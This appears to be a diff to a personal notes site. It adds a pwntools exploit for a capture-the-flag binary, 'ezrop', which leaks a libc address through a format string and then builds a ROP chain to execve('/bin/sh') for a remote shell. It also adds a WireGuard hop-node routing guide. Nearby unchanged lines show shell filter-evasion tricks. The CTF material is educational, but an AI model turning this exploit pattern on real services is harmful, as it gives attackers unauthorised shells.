@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="angr.html">./angr.md</a></li><li class="chapter-item expanded affix "><a href="arch.html">./arch.md</a></li><li class="chapter-item expanded affix "><a href="bash.html">./bash.md</a></li><li class="chapter-item expanded affix "><a href="git.html">./git.md</a></li><li class="chapter-item expanded affix "><a href="joern_badstrlen.html">./joern_badstrlen.md</a></li><li class="chapter-item expanded affix "><a href="libvirt_qemu_vagrant.html">./libvirt_qemu_vagrant.md</a></li><li class="chapter-item expanded affix "><a href="old_stuff.html">./old_stuff.md</a></li><li class="chapter-item expanded affix "><a href="podman.html">./podman.md</a></li><li class="chapter-item expanded affix "><a href="pwn.html">./pwn.md</a></li><li class="chapter-item expanded affix "><a href="ruby.html">./ruby.md</a></li><li class="chapter-item expanded affix "><a href="rust.html">./rust.md</a></li><li class="chapter-item expanded affix "><a href="ssh.html">./ssh.md</a></li><li class="chapter-item expanded affix "><a href="wireguard.html">./wireguard.md</a></li><li class="chapter-item expanded affix "><a href="z3py.html">./z3py.md</a></li></ol>            </div>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="angr.html">./angr.md</a></li><li class="chapter-item expanded affix "><a href="arch.html">./arch.md</a></li><li class="chapter-item expanded affix "><a href="bash.html">./bash.md</a></li><li class="chapter-item expanded affix "><a href="git.html">./git.md</a></li><li class="chapter-item expanded affix "><a href="joern_badstrlen.html">./joern_badstrlen.md</a></li><li class="chapter-item expanded affix "><a href="libvirt_qemu_vagrant.html">./libvirt_qemu_vagrant.md</a></li><li class="chapter-item expanded affix "><a href="old_stuff.html">./old_stuff.md</a></li><li class="chapter-item expanded affix "><a href="podman.html">./podman.md</a></li><li class="chapter-item expanded affix "><a href="pwn.html">./pwn.md</a></li><li class="chapter-item expanded affix "><a href="ruby.html">./ruby.md</a></li><li class="chapter-item expanded affix "><a href="rust.html">./rust.md</a></li><li class="chapter-item expanded affix "><a href="ssh.html">./ssh.md</a></li><li class="chapter-item expanded affix "><a href="wireguard.html">./wireguard.md</a></li><li class="chapter-item expanded affix "><a href="wireguard_with_hop.html">./wireguard_with_hop.md</a></li><li class="chapter-item expanded affix "><a href="z3py.html">./z3py.md</a></li></ol>            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
 
@@ -795,6 +795,117 @@ zsh&lt;&lt;&lt;&quot;&lt;&lt;&lt;$'\x20'&gt;/proc/self/fd/1&quot;
 cat&lt;&lt;&lt;$'\x20'
 cat&lt;&lt;&lt;$'\040'
 </code></pre>
+<h3 id="pwntools---ezrop-exploit"><a class="header" href="#pwntools---ezrop-exploit">pwntools - ezrop exploit</a></h3>
+<pre><code class="language-python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host challenge19.play.potluckctf.com --port 31337 ezrop
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'ezrop')
+exe_rop = ROP(exe)
+
+#libc = ELF('libc.so.6')
+libc = ELF('/usr/lib/libc.so.6')
+libc_rop = ROP(libc)
+context.terminal = ['alacritty', '-e']
+
+# Many built-in settings can be controlled on the command-line and show up
+# in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
+host = args.HOST or 'challenge19.play.potluckctf.com'
+port = int(args.PORT or 31337)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+b *vuln+27
+b *vuln+51
+b *gets
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x400000)
+
+io = start()
+
+io.readuntil(b'Enter your name: ')
+#io.sendline(payload)
+#io.send(p64(exe.sym.get(&quot;printf&quot;)))
+io.send(b&quot;%3$p_XYZ\0&quot;)
+io.send(b'A' * (32 - 9))
+io.send(p64(exe.bss() + 0x388)) # rbp
+io.send(p64(exe.sym.get(&quot;vuln&quot;)+19))
+io.sendline(b'')
+
+
+s = io.readuntil(b'XYZ')
+# throw away XYZ
+s = s[:-4] 
+pointer = int(s, base=16)
+log.info(f&quot;_IO_2_1_stdin_ @ {hex(pointer)}&quot;)
+
+#pwndbg&gt; print 0x7f3cf177b8e0 - 0x7f3cf15a3000
+#$1 = 1935584
+libc.address = pointer - libc.sym['_IO_2_1_stdin_']
+
+log.info(f&quot;libc base set to {hex(libc.address)}&quot;)
+log.info(f&quot;libc.puts would be @ {hex(libc.sym['puts'])}&quot;)
+log.info(&quot;search for a /bin/sh string in libc&quot;)
+
+bin_sh = next(libc.search(b'/bin/sh'))
+log.info(f&quot;/bin/sh in libc @ {hex(bin_sh)}&quot;)
+
+rop = ROP(libc)
+rop.call('execve', [bin_sh, 0, 0])
+log.info(f&quot;rop gadget: {rop.dump()}&quot;)
+log.info(f&quot;rop gadget as bytes: {bytes(rop)}&quot;)
+
+pattern = cyclic(64)
+# io.sendline(pattern)
+# found offset identifier: 0x6161616c6161616b
+log.info(&quot;Offset: {}&quot;.format(pattern.find(p64(0x6161616c6161616b))))
+
+io.send(b'B' * (32))
+io.send(p64(exe.bss() + 0x388)) # rbp
+io.send(bytes(rop)) # rip
+io.sendline(b'')
+
+io.interactive()
+</code></pre>
 <h3 id="pwntools---enumerate-bad-and-good-chars"><a class="header" href="#pwntools---enumerate-bad-and-good-chars">pwntools - enumerate bad and good chars</a></h3>
 <pre><code class="language-python">import requests
 from pwn import *
@@ -1031,22 +1142,84 @@ for p in $(cat participants.txt); do
   echo &gt;&gt; &quot;${server_wireguard_name}.conf&quot;
 done
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="route-all-traffic-through-a-hop-node"><a class="header" href="#route-all-traffic-through-a-hop-node">Route all traffic through a hop node</a></h1>
+<p>Sometimes you want to route all your traffic through a wireguard gateway. But,
+you also want to add a node to hop over. So in total there are three systems:</p>
+<ul>
+<li>A <code>peer</code> which routes all traffic over the <code>hop</code> to the <code>gateway</code>.</li>
+<li>A <code>hop</code> node which is accessible to both systems, it's accessible for both
+systems. </li>
+<li>A <code>gateway</code> which is behind a NATed network and therefore can not be
+accessed directly through the net. The <code>gateway</code> has to keep the connection
+alive to the <code>hop</code>, because the NATed gateway might prohibit the <code>hop</code> to send
+packages after a while.</li>
+</ul>
+<p>All these nodes have their own wireguard configs, so their own private key and
+public key.</p>
+<p>For the hop node, make sure to use policy based routing. This can be done mixed
+with <code>PreUp</code> hooks triggering ip rules which are the policies. Also, a <code>Table</code>
+can be specified for the interface. The routing rules are specified through
+the <code>Peer</code> sections. So all traffic from the wireguard interface is routed only
+on that interface. The configuration file for the <code>hop</code> looks as follows:</p>
+<pre><code>[Interface]
+Address = 10.0.0.1/24
+ListenPort = 51820
+PrivateKey = &lt;hop privkey&gt;
+Table = 123
+PreUp = sysctl -w net.ipv4.ip_forward=1
+PreUp = ip rule add iif %i table 123 priority 456
+PostDown = ip rule del iif %i table 123 priority 456
+
+# a simple peer
+[Peer]
+PublicKey = &lt;peer pubkey&gt;
+AllowedIPs = 10.0.0.3/32
+
+# gateway, all traffic of the 123 table is routed to this.
+[Peer]
+PublicKey = &lt;gateway pubkey&gt;
+AllowedIPs = 0.0.0.0/0
+</code></pre>
+<p>After setting up the <code>hop</code> node, you can proceed with the <code>gateway</code> node. The
+<code>gateway</code> node also uses hooks for additional system configuration. But instead
+of adjusting rules for policy based routing, network packages are NAT'ed using
+<code>iptables</code>. The keyword here is <code>maqsquerade</code>. Additionally, the <code>gateway</code>
+itself might sit behind a NAT (e.g. a home router). To work around that NAT and
+therefore allow the <code>hop</code> node to initate communication to the <code>gateway</code> node,
+a persistent keep alive is configured. You might have to adjust the output
+interface (<code>wlan0</code>) in the masquerading to your suited output inteface (e.g.
+<code>eth0</code> or <code>en1</code>).</p>
+<pre><code>[Interface]
+Address = 10.0.0.2/24
+ListenPort = 51820
+PrivateKey = &lt;gateway privkey&gt;
+PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -t nat -D POSTROUTING -o wlan0 -j MASQUERADE
+
+[Peer]
+PublicKey = &lt;hop pub&gt;
+AllowedIPs = 10.0.0.1/32, 10.0.0.3/32
+Endpoint = 23.88.55.78:51820
+PersistentKeepalive = 25
+</code></pre>
+<p>As the last configuration file, the peer follows. The endpoint specification of
+<code>0.0.0.0/0</code>, causes all traffic to be routed to that client. An DNS server must be
+specified.</p>
+<pre><code>[Interface]
+Address = 10.0.0.3/24
+ListenPort = 51820
+PrivateKey = &lt;peer privkey&gt;
+# adjust the dns server to the local dns server onsite
+DNS = 1.1.1.1
+
+[Peer]
+PublicKey = &lt;hop pubkey&gt;
+AllowedIPs = 0.0.0.0/0, ::/0
+Endpoint = 23.88.55.78:51820
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="z3py"><a class="header" href="#z3py">z3py</a></h1>
 <h3 id="arrays"><a class="header" href="#arrays">arrays</a></h3>
-<pre><code class="language-python">from z3 import *
-s = Solver()
-x = Int('x')
-y = Int('y')
-A = Array('A', IntSort(), IntSort())
-B = Array('B', IntSort(), IntSort())
-
-s.add(x &gt; 100)
-s.add(A[0] == 5)
-s.add(A[x] == x, Store(A, x, y) == A)
-s.add(B == A)
-
-print(s.check())
-print(s.model())
+<pre><code class="language-python">{{#include z3py/array.py}}
 </code></pre>
 <h3 id="eight-queens-problem"><a class="header" href="#eight-queens-problem">eight queens problem</a></h3>
 <pre><code class="language-python"># The eight queens puzzle is the problem of placing eight chess queens on an
